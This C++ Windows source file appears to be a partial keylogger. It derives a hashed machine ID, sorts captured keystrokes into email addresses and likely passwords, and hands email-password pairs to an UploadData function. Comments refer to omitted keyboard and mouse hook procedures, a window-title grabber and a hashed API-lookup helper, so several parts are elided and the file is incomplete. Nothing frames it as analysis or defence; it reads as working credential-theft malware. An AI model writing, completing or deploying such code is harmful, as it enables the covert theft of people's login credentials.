#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h> // For SHA-256
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")

// --- 1. SHA-256 HELPER ---
std::string Sha256(const std::string& input) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD cbData = 0, cbHash = 0, cbHashObject = 0;
    PBYTE pbHashObject = NULL, pbHash = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return "";
    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0) != 0) return "";
    pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
    if (BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0) != 0) return "";
    pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);
    if (BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0) != 0) return "";
    if (BCryptHashData(hHash, (PBYTE)input.c_str(), (ULONG)input.length(), 0) != 0) return "";
    if (BCryptFinishHash(hHash, pbHash, cbHash, 0) != 0) return "";

    std::stringstream ss;
    for (DWORD i = 0; i < cbHash; i++) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pbHash[i];
    
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbHashObject);
    HeapFree(GetProcessHeap(), 0, pbHash);

    return ss.str();
}

// --- 2. SYSTEM METADATA ---
std::string GetMachineId() {
    HW_PROFILE_INFOA hw;
    if (GetCurrentHwProfileA(&hw)) {
        std::string guid = hw.szHwProfileGuid;
        // Strip the curly braces {}
        guid = std::regex_replace(guid, std::regex(R"([{}])"), "");
        // Return the SHA-256 hash of the cleaned GUID to match machineIdSync(true)
        return Sha256(guid);
    }
    return "dev-id-fallback";
}

// (GetHostname, GetOSVersion, GetActiveWindowTitle, WriteDebug, HashString, GetProcAddressH functions remain the same as previous)

// --- 3. UPDATED ENGINE ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void ProcessBuffer() {
    if (buffer.empty()) return;

    // RULE: If the buffer contains a space, it is NOT a password.
    if (buffer.find(' ') != std::string::npos) {
        WriteDebug("Space detected. Buffer discarded: " + buffer);
        buffer.clear();
        return;
    }

    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteDebug("Email Stored: " + savedEmail);
    } else if (buffer.length() >= 8 && !savedEmail.empty()) {
        // Only upload if we have a stored email and no spaces in the password
        UploadData(savedEmail, buffer);
        savedEmail.clear();
    }
    buffer.clear();
}

// (KeyProc, MouseProc, and WinMain functions remain the same as previous)
